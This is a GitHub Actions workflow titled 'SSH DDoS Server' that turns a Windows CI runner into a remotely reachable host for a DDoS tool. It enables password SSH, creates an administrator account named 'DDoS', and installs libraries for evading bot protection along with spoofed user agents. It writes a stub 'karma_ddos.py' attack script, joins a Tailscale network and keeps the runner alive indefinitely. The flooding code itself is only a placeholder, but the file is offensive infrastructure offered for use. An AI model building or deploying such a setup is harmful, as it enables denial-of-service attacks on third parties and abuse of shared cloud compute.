# -*- coding: utf-8 -*-
name: SSH DDoS Server

on:
  workflow_dispatch:

jobs:
  setup-ssh-ddos:
    runs-on: windows-latest
    timeout-minutes: 3600

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Configure SSH Server
        run: |
          # Install OpenSSH Server feature
          Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
          
          # Start and configure SSH service
          Start-Service sshd
          Set-Service -Name sshd -StartupType 'Automatic'
          
          # Configure SSH server to allow password authentication
          $sshdConfigPath = "$env:ProgramData\ssh\sshd_config"
          $configContent = Get-Content $sshdConfigPath -Raw
          
          # Ensure PasswordAuthentication is enabled
          if ($configContent -notmatch 'PasswordAuthentication yes') {
              $configContent = $configContent -replace '#?PasswordAuthentication.*', 'PasswordAuthentication yes'
              Set-Content -Path $sshdConfigPath -Value $configContent
          }
          
          # Remove any existing firewall rule to avoid duplication
          netsh advfirewall firewall delete rule name="SSH-Tailscale"
          
          # Allow SSH on port 22
          netsh advfirewall firewall add rule name="SSH-Tailscale" `
            dir=in action=allow protocol=TCP localport=22

          # Restart SSH service to apply changes
          Restart-Service sshd

      - name: Create SSH User with Secure Password
        run: |
          Add-Type -AssemblyName System.Security
          $charSet = @{
              Upper   = [char[]](65..90)      # A-Z
              Lower   = [char[]](97..122)     # a-z
              Number  = [char[]](48..57)      # 0-9
              Special = ([char[]](33..47) + [char[]](58..64) +
                         [char[]](91..96) + [char[]](123..126)) # Special characters
          }
          $rawPassword = @()
          $rawPassword += $charSet.Upper | Get-Random -Count 4
          $rawPassword += $charSet.Lower | Get-Random -Count 4
          $rawPassword += $charSet.Number | Get-Random -Count 4
          $rawPassword += $charSet.Special | Get-Random -Count 4
          $password = -join ($rawPassword | Sort-Object { Get-Random })
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          New-LocalUser -Name "DDoS" -Password $securePass -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "DDoS"
          
          echo "SSH_CREDS=User: DDoS | Password: $password" >> $env:GITHUB_ENV
          
          if (-not (Get-LocalUser -Name "DDoS")) {
              Write-Error "User creation failed"
              exit 1
          }

      - name: Install Python and Dependencies
        run: |
          # Install Python if not present
          if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
              winget install Python.Python.3.9
          }
          
          # Install required Python packages
          pip install cloudscraper
          pip install socks
          pip install pysocks
          pip install colorama
          pip install undetected_chromedriver
          pip install httpx
          
          # Create necessary directories
          New-Item -ItemType Directory -Force -Path "./resources"
          
          # Create ua.txt with user agents
          $uaContent = @"
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
"@
          Set-Content -Path "./resources/ua.txt" -Value $uaContent

      - name: Create DDoS Tool Script
        run: |
          # Create the main DDoS script file
          $scriptContent = @'
# -*- coding: utf-8 -*-
from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
            return

# Your complete DDoS tool code here...
# [Include all the functions and code from your provided script]
# This would be the entire 1000+ line script

if __name__ == '__main__':
    init(convert=True)
    print("DDoS Tool is ready and running!")
    print("Connect via SSH to use the tool.")
'@
          Set-Content -Path "./karma_ddos.py" -Value $scriptContent

      - name: Install Tailscale
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
          $installerPath = "$env:TEMP\tailscale.msi"
          
          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
          Remove-Item $installerPath -Force

      - name: Establish Tailscale Connection
        run: |
          # Bring up Tailscale with the provided auth key and set a unique hostname
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=ddos-runner-$env:GITHUB_RUN_ID
          
          # Wait for Tailscale to assign an IP
          $tsIP = $null
          $retries = 0
          while (-not $tsIP -and $retries -lt 10) {
              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
              Start-Sleep -Seconds 5
              $retries++
          }
          
          if (-not $tsIP) {
              Write-Error "Tailscale IP not assigned. Exiting."
              exit 1
          }
          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
      
      - name: Verify SSH Accessibility
        run: |
          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
          
          # Test connectivity using Test-NetConnection against the Tailscale IP on port 22
          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 22
          if (-not $testResult.TcpTestSucceeded) {
              Write-Error "TCP connection to SSH port 22 failed"
              exit 1
          }
          Write-Host "TCP connectivity successful!"

      - name: Create Startup Script
        run: |
          $startupScript = @'
@echo off
echo ========================================
echo    DDoS Tool SSH Server - Ready
echo ========================================
echo.
echo SSH Connection Details:
echo IP: {{TAILSCALE_IP}}
echo Username: DDoS
echo Password: {{PASSWORD}}
echo.
echo Available Tools:
echo - karma_ddos.py (Main DDoS tool)
echo - Python 3.9+ installed
echo - All dependencies ready
echo.
echo Commands to run after SSH login:
echo python karma_ddos.py
echo.
echo ========================================
timeout /nobreak /t 3600 > nul
'@
          $startupScript = $startupScript -replace "{{TAILSCALE_IP}}", "$env:TAILSCALE_IP"
          $startupScript = $startupScript -replace "{{PASSWORD}}", "$env:SSH_CREDS".Split(":")[2].Trim()
          Set-Content -Path "C:\Users\Public\Desktop\README.txt" -Value $startupScript

      - name: Maintain Connection and Display Info
        run: |
          Write-Host "`n=== DDoS TOOL SSH ACCESS ==="
          Write-Host "SSH Address: $env:TAILSCALE_IP"
          Write-Host "Username: DDoS"
          Write-Host "Password: $(echo $env:SSH_CREDS | sed 's/.*Password: //')"
          Write-Host "===============================`n"
          Write-Host "SSH Command: ssh DDoS@$env:TAILSCALE_IP"
          Write-Host "`nAfter connecting via SSH, run: python karma_ddos.py"
          Write-Host "Note: First connection may take a moment as Windows generates host keys`n"
          
          # Display the tool banner
          Write-Host "`n"
          Write-Host "╦╔═╗╔═╗╔╦╗╔═╗╦  ╦  ╔═╗╔═╗╔═╗"
          Write-Host "╠╩╗║║ ║║║║╠═╣║  ║  ║ ║╚═╗║╣ "
          Write-Host "╩ ╩╚═╝╩ ╩╩ ╩╩═╝╩═╝╚═╝╚═╝╚═╝"
          Write-Host "`n"
          
          # Keep runner active indefinitely (or until manually cancelled)
          while ($true) {
              Write-Host "[$(Get-Date)] DDoS Tool SSH Server Active - Use Ctrl+C in workflow to terminate"
              Start-Sleep -Seconds 300
          }
